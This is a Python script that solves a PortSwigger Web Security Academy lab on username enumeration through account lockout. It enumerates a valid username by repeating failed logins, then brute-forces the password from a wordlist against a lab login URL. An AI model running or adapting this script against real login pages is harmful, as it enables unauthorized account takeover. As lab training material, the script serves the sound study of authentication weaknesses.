# https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-account-lock


import requests
from itertools import product
import re


with open('usernames.txt', 'r') as f:
    usernames = f.read().splitlines()

with open('passwords.txt', 'r') as f:
    passwords = f.read().splitlines()


url = 'https://....web-security-academy.net/login'
found_username = ''
found_password = ''


for username, i in product(usernames, range(5)):

    login_body = {
        'username': username,
        'password': 'lol'
    }
    r = requests.post(url=url, data=login_body)

    if 'Invalid username or password' not in r.text:
        found_username = username
        break

print('Username: ', found_username)


for i, password in enumerate(passwords):

    login_body = {
        'username': found_username,
        'password': password
    }
    r = requests.post(url=url, data=login_body)

    message = re.findall(r'<p class=is-warning>(.*?)</p>', r.text, re.DOTALL)

    if not message:
        found_password = password
        break

print('Password: ', found_password)
